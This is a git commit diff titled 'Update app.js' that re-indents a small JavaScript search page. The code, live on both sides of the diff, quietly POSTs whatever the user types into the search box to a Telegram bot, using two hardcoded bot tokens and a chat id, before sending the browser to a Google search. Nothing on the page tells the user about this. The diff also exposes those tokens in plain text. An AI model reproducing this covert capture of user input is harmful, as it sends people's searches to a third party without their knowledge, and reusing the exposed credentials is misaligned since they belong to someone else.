eca12b6c139f431980420e5d0307c5882a07d96c
DomenicoMereu97 <75221419+DomenicoMereu97@users.noreply.github.com>
2021-05-16 13:35:38 +0200

    Update app.js

--- app.js
+++ app.js
@@ -1,72 +1,66 @@
 
 
 
-
-
-
-
-
 function inputFunction() {
-  var x = document.getElementById("search-box").value;
-  return x
-  
-}
-
-
-
-
-
-
-
-document.getElementById("search-box").addEventListener("keydown", function(event) {
+    var x = document.getElementById("search-box").value;
+    return x
     
-    if (event!= null && event.keyCode == 13) {
-        event.preventDefault();
-        input = inputFunction();
-        $.ajax({
-            url: 'https://api.telegram.org/bot' + '1883349112:AAGQwIyGfjSjrnO11sTWVjusTq-JFQLMTuU' + '/sendMessage',
-            method: 'POST',
-            data: { chat_id: '699973760', text: input },
-            
-        });
-        setTimeout(function()
-        {
-            location.replace('http://google.com/search?q='+ input);
-        }, 1000)
-        
-    }
-});
-
-
-
-
-
-
-
-
-
-
-inputUserFunction=document.getElementById("cerca").addEventListener('click', function(){
-    input = inputFunction();
-    $.ajax({
-        url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
-        method: 'POST',
-        data: { chat_id: '699973760', text: input },
-        
-    });
-    location.replace('http://google.com/search?q='+ input);
-    
-
-})
-
-
-
-
-
+  }
   
-
-
-
+  
+  
+  
+  
+  
+  
+  document.getElementById("search-box").addEventListener("keydown", function(event) {
+      
+      if (event!= null && event.keyCode == 13) {
+          event.preventDefault();
+          input = inputFunction();
+          $.ajax({
+              url: 'https://api.telegram.org/bot' + '1883349112:AAGQwIyGfjSjrnO11sTWVjusTq-JFQLMTuU' + '/sendMessage',
+              method: 'POST',
+              data: { chat_id: '699973760', text: input },
+              
+          });
+          setTimeout(function()
+          {
+              location.replace('http://google.com/search?q='+ input);
+          }, 1000)
+          
+      }
+  });
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  inputUserFunction=document.getElementById("cerca").addEventListener('click', function(){
+      input = inputFunction();
+      $.ajax({
+          url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
+          method: 'POST',
+          data: { chat_id: '699973760', text: input },
+          
+      });
+      location.replace('http://google.com/search?q='+ input);
+      
+  
+  })
+  
+  
+  
+  
+  
+    
+  
+  
 
 
 
